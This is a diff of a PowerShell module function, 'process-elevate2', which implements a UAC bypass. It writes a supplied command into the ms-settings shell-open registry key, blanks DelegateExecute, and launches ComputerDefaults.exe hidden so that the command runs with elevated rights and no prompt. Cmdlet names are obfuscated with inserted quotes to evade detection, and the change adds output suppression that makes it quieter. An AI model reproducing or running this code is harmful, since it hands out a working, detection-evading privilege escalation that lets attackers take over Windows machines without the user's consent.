@@ -269,11 +269,11 @@ function process-elevate2 {
 		[string]$processName
     )
     $Request =  $processName
-N'e'W-I'te'm "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+N'e'W-I'te'm "HKCU:\software\classes\ms-settings\shell\open\command" -Force|OUT-NULL
 sleep(5.3);
-se'T-iT'EmP'rop'erty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$Request" -force
+se'T-iT'EmP'rop'erty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$Request" -force|OUT-NULL
 sleep(7.3);
-n'Ew-I'te'mPr'operty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;(![BOOL]);sleep(9.3);
+n'Ew-I'te'mPr'operty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force |OUT-NULL;(![BOOL]);sleep(9.3);
 Start-Process -WindowStyle hidden "C:\Windows\System32\ComputerDefaults.exe"
 }
 Export-ModuleMember -Function process-elevate2
